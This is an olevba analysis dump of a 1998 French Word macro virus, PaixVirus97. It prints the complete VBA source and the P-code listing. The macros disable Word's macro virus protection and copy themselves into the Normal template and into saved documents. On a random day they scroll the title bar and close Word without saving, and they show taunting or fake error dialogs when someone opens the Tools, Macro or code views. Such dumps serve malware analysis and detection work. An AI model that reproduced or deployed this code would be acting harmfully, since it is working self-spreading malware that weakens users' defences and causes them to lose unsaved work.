olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.PaixVirus
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.PaixVirus - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PaixVirus97.bas 
in file: Virus.MSWord.PaixVirus - OLE stream: 'Macros/VBA/PaixVirus97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAE
Dim MyDate, MyWeek, N$
MyDate = Date
MyWeek = WeekDay(MyDate, vbMonday)
Randomize
N$ = Int(Rnd * 7) + 1
If MyWeek = N$ Then
    MsgBox "C'est le jour J pour moi...", vbInformation, "PaixVirus97"
    Call PaixV97Pay
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
iMacroCount = WordBasic.CountMacros(0, 0)
On Error GoTo ErrorAO
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "PaixVirus97" Then
        PaixVirus97Installed = -1
    End If
Next i
If Not PaixVirus97Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PaixVirus97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PaixMsg1", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PaixMsg2", Object:=wdOrganizerObjectProjectItems
    MsgBox "La PAIX soit avec vous..." & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "PaixVirus97"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PaixVirus97", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PaixMsg1", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PaixMsg2", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    PaixMsg1.Show
    ActiveWindow.Caption = "PaixVirus97 est là !!!!"
ErrorFT:
End Sub
Private Sub PaixV97Pay()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPV97P
For t = 1 To 10
ActiveWindow.Caption = "Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                        Je veux avoir la paix!!!!!, merci "
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                                                Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
ActiveWindow.Caption = "                                                                                                                        Je veux avoir la paix!!!!!, merci"
For i = 1 To 400000
Next i
Next t
Application.Quit SaveChanges:=wdDoNotSaveChanges
ErrorPV97P:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    PaixMsg2.Show
    ActiveWindow.Caption = "PaixVirus97 est là !!!!"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PaixMsg2.frm 
in file: Virus.MSWord.PaixVirus - OLE stream: 'Macros/VBA/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload PaixMsg2
End Sub
Private Sub userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO PaixMsg1.frm 
in file: Virus.MSWord.PaixVirus - OLE stream: 'Macros/VBA/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload PaixMsg1
End Sub
Private Sub userform_initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.PaixVirus
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/PaixVirus97 - 14359 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	OnError ErrorAE 
' Line #5:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyWeek
' 	VarDefn N
' Line #6:
' 	Ld Date 
' 	St MyDate 
' Line #7:
' 	Ld MyDate 
' 	Ld vbMonday 
' 	ArgsLd WeekDay 0x0002 
' 	St MyWeek 
' Line #8:
' 	ArgsCall Read 0x0000 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St N$ 
' Line #10:
' 	Ld MyWeek 
' 	Ld N$ 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitStr 0x001B "C'est le jour J pour moi..."
' 	Ld vbInformation 
' 	LitStr 0x000B "PaixVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #12:
' 	ArgsCall (Call) PaixV97Pay 0x0000 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Label ErrorAE 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Sub AutoOpen())
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #21:
' 	OnError ErrorAO 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #23:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000B "PaixVirus97"
' 	Eq 
' 	IfBlock 
' Line #24:
' 	LitDI2 0x0001 
' 	UMi 
' 	St PaixVirus97Installed 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	Ld PaixVirus97Installed 
' 	Not 
' 	IfBlock 
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "PaixVirus97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "PaixMsg1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "PaixMsg2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	LitStr 0x0019 "La PAIX soit avec vous..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000E "HAHAHAHAHA!!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000B "PaixVirus97"
' 	ArgsCall MsgBox 0x0003 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Label ErrorAO 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub FileSaveAs())
' Line #36:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #37:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #39:
' 	OnError ErrorFSA 
' Line #40:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #42:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "PaixVirus97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "PaixMsg1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "PaixMsg2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #48:
' 	Label ErrorFSA 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub FileTemplates())
' Line #51:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #52:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #54:
' 	OnError ErrorFT 
' Line #55:
' 	Ld PaixMsg1 
' 	ArgsMemCall Show 0x0000 
' Line #56:
' 	LitStr 0x0017 "PaixVirus97 est là !!!!"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #57:
' 	Label ErrorFT 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Private Sub PaixV97Pay())
' Line #60:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #61:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #62:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #63:
' 	OnError ErrorPV97P 
' Line #64:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #65:
' 	LitStr 0x0021 "Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #66:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #67:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' 	LitStr 0x0029 "        Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #69:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	LitStr 0x0031 "                Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #73:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	LitStr 0x0039 "                        Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #75:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #76:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #77:
' 	LitStr 0x0041 "                                Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #78:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #79:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' 	LitStr 0x004A "                                        Je veux avoir la paix!!!!!, merci "
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #81:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #82:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	LitStr 0x0051 "                                                Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #84:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #85:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #86:
' 	LitStr 0x0059 "                                                        Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #87:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	LitStr 0x0061 "                                                                Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #90:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #92:
' 	LitStr 0x0069 "                                                                        Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #93:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #94:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	LitStr 0x0071 "                                                                                Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #96:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #97:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #98:
' 	LitStr 0x0079 "                                                                                        Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #99:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' 	LitStr 0x0081 "                                                                                                Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #102:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #103:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #104:
' 	LitStr 0x0089 "                                                                                                        Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #105:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #106:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	LitStr 0x0091 "                                                                                                                Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #108:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #109:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' 	LitStr 0x0099 "                                                                                                                        Je veux avoir la paix!!!!!, merci"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #111:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #112:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #113:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #115:
' 	Label ErrorPV97P 
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Sub ToolsMacro())
' Line #118:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #119:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #120:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #121:
' 	OnError ErrorTM 
' Line #122:
' 	Ld PaixMsg2 
' 	ArgsMemCall Show 0x0000 
' Line #123:
' 	LitStr 0x0017 "PaixVirus97 est là !!!!"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #124:
' 	Label ErrorTM 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub ViewVBCode())
' Line #127:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #128:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #129:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #130:
' 	OnError ErrorVVBC 
' Line #131:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #132:
' 	Label ErrorVVBC 
' Line #133:
' 	EndSub 
' Macros/VBA/PaixMsg2 - 2634 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld PaixMsg2 
' 	ArgsCall Unlock 0x0001 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub userform_initialize())
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	EndSub 
' Macros/VBA/PaixMsg1 - 2626 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld PaixMsg1 
' 	ArgsCall Unlock 0x0001 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub userform_initialize())
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Le virus PaixVirus97 vous a infect�...J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98 vous souhaite la paix �ternelle!!!H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J'esp�re que cel� ne vous emb�tera pas...!!.&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HAHAHAHAHA!!!!I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1998 � par ZeMacroKiller98H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cliquer ici
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pourquoi ne voulez-pas la PAIX ?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce n'est pas tr�s intelligent de votre part.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Le calme y a que �a de vrai...K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Allez, je suis sympa, je reste avec vous!!!.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� car vous ne pourrez pas m'�liminer!!!!!S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JE VIENS EN PAIX!!!
-------------------------------------------------------------------------------
